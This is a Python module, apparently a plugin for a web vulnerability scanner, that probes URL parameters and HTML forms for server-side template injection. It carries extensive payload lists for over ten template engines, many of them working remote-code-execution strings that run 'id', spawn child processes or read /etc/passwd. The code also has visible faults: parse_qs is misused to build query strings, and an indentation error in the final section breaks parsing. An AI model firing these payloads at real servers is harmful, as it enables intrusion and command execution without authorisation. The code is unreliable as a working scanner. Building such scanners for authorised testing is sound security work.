import logging
import re
from urllib.parse import parse_qs, urljoin, urlparse
import time
from . import get_session

# Enhanced SSTI payloads grouped by template engine
TEMPLATE_PAYLOADS = {
    # Jinja2/Twig/Flask
    'jinja': {
        'test_payloads': [
            '{{7*7}}', '{{config}}', '{{"string".upper()}}', '{{7*7}}',
            '{% for c in [1,2,3] %}{{c}}{% endfor %}',
            '{{request|attr("application")|attr("__globals__")|attr("__builtins__")|attr("__import__")("os").popen("id").read()}}'
        ],
        'detection_markers': ['49', 'STRING', 'ImmutableDict', '__builtins__', '123']
    },

    # Ruby ERB
    'erb': {
        'test_payloads': [
            '<%= 7*7 %>', '<%= File.open("/etc/passwd").read %>', 
            '<%= Dir.entries("/") %>', '<%= system("whoami") %>'
        ],
        'detection_markers': ['49', 'root', 'Directory', 'File']
    },

    # PHP Twig
    'twig': {
        'test_payloads': [
            '{{_self.env.setCache("foo")}}{{_self.env.getCache("foo")}}',
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
        ],
        'detection_markers': ['cache', 'env', 'filter', 'Twig']
    },

    # Freemarker
    'freemarker': {
        'test_payloads': [
            '${7*7}', '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
            '${object.getClass().forName("java.lang.Runtime").getRuntime().exec("ls -la")}'
        ],
        'detection_markers': ['49', 'java.lang.Runtime', 'getRuntime', 'freemarker']
    },

    # Velocity
    'velocity': {
        'test_payloads': [
            '#set($x = 7*7)${x}', '#set($class=$object.class.forName("java.lang.Runtime"))',
            '#set($ex=$class.getRuntime().exec("ls"))'
        ],
        'detection_markers': ['49', 'getRuntime', 'Apache Velocity']
    },

    # Handlebars
    'handlebars': {
        'test_payloads': [
            '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.push (lookup string.sub "constructor")}}{{this.push "return require(\'child_process\').execSync(\'whoami\');"}}{{#each conslist}}{{#with (string.sub.apply 0 this)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}'
        ],
        'detection_markers': ['constructor', 'Handlebars', 'helper']
    },

    # Pebble
    'pebble': {
        'test_payloads': [
            '{{ variable.getClass().forName("java.lang.Runtime").getRuntime().exec("ls") }}'
        ],
        'detection_markers': ['pebble', 'PebbleEngine', 'forName']
    }
}

# Regular expressions for common SSTI outputs
SSTI_PATTERNS = [
    r'\b49\b',                                      # Simple math evaluation (7*7)
    r'<(DirectoryEntry|File|IO)>',                  # Ruby/Python objects 
    r'(dirname|filename): ["\']?[\\/]',             # Path indicators
    r'(uid|gid|groups)=[0-9]{1,5}',                 # ID/group information
    r'ImmutableMultiDict|MultiDict|OrderedDict',    # Flask/Django collections
    r'<\w+ object at 0x[\da-f]+>',                  # Python object memory address
    r'\[("[^"]+",?\s*)+\]',                         # Array output
    r'java\.lang\.(Runtime|ProcessBuilder)',        # Java objects
    r'Built-in (module|function|method)'            # Python builtins
]

# Categorized SSTI payloads for various template engines
SSTI_PAYLOADS = {
    # Probe payloads to detect if template injection exists
    "probe": [
        "{{7*7}}",  # Basic math - works in most engines
        "${7*7}",   # Expression language syntax
        "#{7*7}",   # Ruby/etc syntax
        "<%= 7*7 %>", # ERB/EJS syntax
        "{7*7}",    # Some simple template engines
        "{% if 7*7==49 %}VULNERABLE{% endif %}" # Twig/Jinja/Django condition
    ],
    
    # Jinja2 (Python) specific payloads
    "jinja2": [
        "{{7*'7'}}",  # Will return 7777777 in Jinja
        "{{config}}",  # Dump Flask config object
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}"
    ],
    
    # Twig (PHP) specific payloads
    "twig": [
        "{{['id']|filter('system')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('cat /etc/passwd')}}",
        "{{'id'|passthru}}",
        "{{dump(_context)}}"
    ],
    
    # ERB (Ruby) specific payloads
    "erb": [
        "<%= 7 * 7 %>",
        "<%= system('id') %>",
        "<%= `id` %>",
        "<%= IO.popen('id').read() %>",
        "<%= File.open('/etc/passwd').read %>"
    ],
    
    # Freemarker (Java) specific payloads
    "freemarker": [
        "${7*7}",
        "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "${product.getClass().getProtectionDomain().getCodeSource().getLocation()}"
    ],
    
    # Velocity (Java) specific payloads
    "velocity": [
        "#set($x = $class.inspect(\"java.lang.Runtime\").getRuntime().exec(\"id\"))",
        "#set($x = $class.inspect(\"java.lang.Runtime\").getRuntime().exec(\"id\").getInputStream())",
        "#set($str = $class.inspect(\"java.lang.String\").getConstructor(\"byte[]\").newInstance($x.readAllBytes()))",
        "$str"
    ],
    
    # Handlebars (JavaScript) specific payloads
    "handlebars": [
        "{{#with \"s\" as |string|}}\n{{#with \"e\"}}\n{{#with split as |conslist|}}\n{{this.push (lookup string.constructor \"prototype\")}}\n{{this.push \"return require('child_process').execSync('id')\"}}\n{{#each conslist}}\n{{#with (string.constructor.apply 0 this)}}\n{{this}}\n{{/with}}\n{{/each}}\n{{/with}}\n{{/with}}\n{{/with}}",
        "{{#with this as |obj|}}\n{{#with (obj.constructor.keys)}}{{this.constructor.name.toString.constructor.call this \"return process.mainModule.require('child_process').execSync('id')\"}}{{/with}}\n{{/with}}"
    ],
    
    # EJS (JavaScript) specific payloads
    "ejs": [
        "<%= process.mainModule.require('child_process').execSync('id') %>",
        "<%= global.process.mainModule.require('child_process').execSync('id') %>"
    ],
    
    # Pug/Jade (JavaScript) specific payloads
    "pug": [
        "#{ process.mainModule.require('child_process').execSync('id') }",
        "- var x = global.process.mainModule.require('child_process').execSync('id')",
        "= x"
    ],
    
    # Smarty (PHP) specific payloads
    "smarty": [
        "{php}echo `id`;{/php}",
        "{system('id')}",
        "{literal}<!--{/literal}{system('id')}{literal}-->{/literal}"
    ],
    
    # .NET Razor specific payloads
    "razor": [
        "@{System.Diagnostics.Process.Start(\"cmd.exe\",\"/c id\")}",
        "@{System.IO.File.ReadAllText(\"C:/Windows/win.ini\")}",
        "@(new System.Diagnostics.Process{StartInfo={FileName=\"cmd\",Arguments=\"/c id\",RedirectStandardOutput=true,UseShellExecute=false},EnableRaisingEvents=true}).Start().StandardOutput.ReadToEnd()"
    ],
    
    # Expression Language (Java) specific payloads
    "el": [
        "${7*7}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}"
    ]
}

# Signatures for identifying template engines from responses
ENGINE_SIGNATURES = {
    "jinja2": [
        "jinja2.exceptions", "werkzeug", "flask.", "Jinja2 Error", "Template error", "runtime error",
        # Look for specific Jinja2 object dump formats
        "'Undefined' object has no attribute", "<TemplateReference object", "SandboxedEnvironment"
    ],
    "twig": [
        "Twig\\", "Twig_Error", "TwigTemplate", "Unable to find template", "Twig\Template"
    ],
    "erb": [
        "ActionView::Template", "erb"
    ],
    "freemarker": [
        "FreeMarker template error", "freemarker.template", "freemarker.core"
    ],
    "velocity": [
        "org.apache.velocity", "VelocityEngine", "velocity"
    ],
    "handlebars": [
        "handlebars", "Handlebars.compile", "handlebarsjs", "Cannot find module 'handlebars'"
    ],
    "ejs": [
        "ejs", "EJS Error", "EJS syntax error", "Error: Could not find the include file"
    ],
    "pug": [
        "pug", "jade", "Pug Error", "Jade Error", "Cannot read property 'lineno' of undefined"
    ],
    "smarty": [
        "Smarty error", "Smarty_Compiler", "smarty"
    ],
    "razor": [
        "Microsoft.AspNetCore.Mvc.Razor", "Error processing resource", "@model", "cshtml"
    ],
    "el": [
        "javax.el.ELException", "javax.servlet.jsp", "jakarta.el.ELException", "ELResolver"
    ]
}

def check(session, url, soup, response, config):
    """
    Enhanced SSTI scanner with optimized detection algorithms and systematic testing approach.
    
    Args:
        session: Session object for making requests
        url: Target URL to test
        soup: BeautifulSoup object of the response
        response: HTTP response object
        config: Configuration dictionary
        
    Returns:
        List of findings
    """
    req_session = get_session(session)
    findings = []
    
    # Get baseline response metrics
    baseline_content = response.text
    baseline_length = len(baseline_content)
        
    # Parse URL to get parameters
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    
    # Extract forms from the page
    forms = []
    if soup:
        forms = soup.find_all('form')
    
    # Track vulnerable elements to avoid redundant tests
    vulnerable_params = set()
    vulnerable_forms = set()
    tested_patterns = set()
    
    # Store detected template engines
    detected_engines = set()
    
    # --- 1. Check for SSTI evidence in the baseline response ---
    for engine, signatures in ENGINE_SIGNATURES.items():
        for signature in signatures:
            if signature in baseline_content:
                detected_engines.add(engine)
                findings.append(f"Potential {engine.upper()} template engine detected from response signature")
    
    # --- 2. Test URL parameters for SSTI ---
    for param_name, param_values in params.items():
        # Start with probe payloads
        for payload in SSTI_PAYLOADS["probe"]:
            evidence_key = f"param:{param_name}:{payload}"
            if evidence_key in tested_patterns:
                continue
                
            tested_patterns.add(evidence_key)
            param_value = param_values[0] if param_values else ""
            
            # Create test URL with injected payload
            new_params = params.copy()
            new_params[param_name] = [payload]
            query_string = parse_qs(new_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
            
            try:
                start_time = time.time()
                r = req_session.get(test_url, timeout=5)
                response_time = time.time() - start_time
                
                # Check for mathematical evaluation (49 = 7*7)
                if "49" in r.text and "49" not in baseline_content:
                    findings.append(f"SSTI vulnerability detected in parameter '{param_name}' with probe payload: {payload}")
                    vulnerable_params.add(param_name)
                    
                    # Try to identify the template engine
                    for engine, signatures in ENGINE_SIGNATURES.items():
                        for signature in signatures:
                            if signature in r.text and signature not in baseline_content:
                                detected_engines.add(engine)
                                findings.append(f"- Template engine identified as {engine.upper()}")
                                break
                        if engine in detected_engines:
                            break
                    
                    break  # Found vulnerability in this parameter, move to next one
            except Exception:
                continue
    
    # --- 3. If we found vulnerable parameters, try more specific payloads ---
    for param_name in vulnerable_params:
        detected_engine_payloads = []
        
        # If we detected specific engine(s), use those payloads first
        for engine in detected_engines:
            if engine in SSTI_PAYLOADS:
                detected_engine_payloads.extend(SSTI_PAYLOADS[engine][:2])  # First 2 payloads for each detected engine
        
        # If no specific engine detected or no matching payloads, test with common ones
        if not detected_engine_payloads:
            test_engines = ["jinja2", "twig", "erb", "freemarker"]  # Most common
            for engine in test_engines:
                detected_engine_payloads.extend(SSTI_PAYLOADS[engine][:1])  # First payload for each engine
        
        # Test additional payloads
        for payload in detected_engine_payloads:
            evidence_key = f"param:{param_name}:adv:{payload[:20]}"
            if evidence_key in tested_patterns:
                continue
                
            tested_patterns.add(evidence_key)
            
            # Create test URL with injected payload
            new_params = params.copy()
            new_params[param_name] = [payload]
            query_string = parse_qs(new_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
            
            try:
                r = req_session.get(test_url, timeout=5)
                
                # Check for command execution (id command output)
                if any(marker in r.text for marker in ["uid=", "gid=", "groups=", "root:", "System.IO", 
                                                      "process.mainModule", "child_process"]):
                    findings.append(f"SSTI RCE confirmed in parameter '{param_name}' with advanced payload: {payload[:50]}...")
                    break  # Found RCE, no need for more tests on this parameter
            except Exception:
                continue
    
    # --- 4. Test forms for SSTI ---
    for form_index, form in enumerate(forms):
        # Skip forms we've already found to be vulnerable
        if form_index in vulnerable_forms:
            continue
            
        form_action = form.get('action', '')
        form_method = form.get('method', 'get').lower()
        form_action_url = urljoin(url, form_action) if form_action else url
        
        # Extract form inputs
        inputs = {}
        for input_tag in form.find_all(['input', 'textarea']):
            name = input_tag.get('name')
            if name:
                inputs[name] = input_tag.get('value', '')
                
        if not inputs:
            continue  # Skip forms with no inputs
            
        # Test each input in the form with probe payloads
        for input_name, input_value in inputs.items():
            for payload in SSTI_PAYLOADS["probe"]:
                evidence_key = f"form:{form_index}:{input_name}:{payload}"
                if evidence_key in tested_patterns:
                    continue
                    
                tested_patterns.add(evidence_key)
                
                # Prepare form data with payload
                form_data = inputs.copy()
                form_data[input_name] = payload
                
                try:
                    # Submit the form
                    if form_method == 'post':
                        r = req_session.post(form_action_url, data=form_data, timeout=5)
                    else:
                        r = req_session.get(form_action_url, params=form_data, timeout=5)
                        
                    # Check for mathematical evaluation
                    if "49" in r.text and "49" not in baseline_content:
                        form_info = f"action='{form_action}', method='{form_method}'"
                        findings.append(f"SSTI vulnerability detected in form input '{input_name}' ({form_info}) with probe payload: {payload}")
                        vulnerable_forms.add(form_index)
                        break  # Found vulnerability in this input, move to next form
                except Exception:
                    continue
    
    # --- 5. Check for common template paths/filenames in URL ---
    template_file_patterns = [
        r'\.tmpl$', r'\.tpl$', r'\.template$', r'\.j2$', r'\.jinja2?$', 
        r'\.phtml$', r'\.erb$', r'\.twig$', r'\.ejs$', r'\.vm$', r'\.hbs$'
    ]
    
    for pattern in template_file_patterns:
        if re.search(pattern, url, re.IGNORECASE):
            findings.append(f"URL path contains potential template file extension (matching '{pattern}')")
            break
    
    # --- 6. If no template engine detected yet, look for other evidence ---
    if not detected_engines and not vulnerable_params and not vulnerable_forms:
        # Check for potentially revelatory HTTP headers
        template_headers = {
            "X-Powered-By": response.headers.get("X-Powered-By", ""),
            "Server": response.headers.get("Server", ""),
            "X-AspNet-Version": response.headers.get("X-AspNet-Version", ""),
            "X-Generator": response.headers.get("X-Generator", "")
        }
        
        for header_name, header_value in template_headers.items():
            for engine, signatures in ENGINE_SIGNATURES.items():
                for signature in signatures:
                    if signature.lower() in header_value.lower():
                        findings.append(f"Potential {engine.upper()} template engine detected from HTTP header {header_name}: {header_value}")
            break
    
    # --- 7. Check HTTP response status changes ---
    if params and not vulnerable_params:
        # Try a payload known to cause errors in many template engines
        error_payload = "{{1/0}}"  # Division by zero error
        for param_name, param_values in params.items():
            evidence_key = f"param:{param_name}:error:{error_payload}"
            if evidence_key in tested_patterns:
            continue
                
            tested_patterns.add(evidence_key)
            
            # Create test URL with injected payload
            new_params = params.copy()
            new_params[param_name] = [error_payload]
            query_string = parse_qs(new_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
            
            try:
                r = req_session.get(test_url, timeout=5)
                
                # Check for error status code
                if r.status_code != response.status_code and r.status_code in [500, 400, 422]:
                    findings.append(f"Potential SSTI in parameter '{param_name}': Error status {r.status_code} with payload {error_payload}")
                    
                    # Look for error messages that might reveal template engine
                    for engine, signatures in ENGINE_SIGNATURES.items():
                        for signature in signatures:
                            if signature in r.text and signature not in baseline_content:
                                findings.append(f"- Error indicates {engine.upper()} template engine")
                                break
                    break
            except Exception:
                continue
    
    return findings
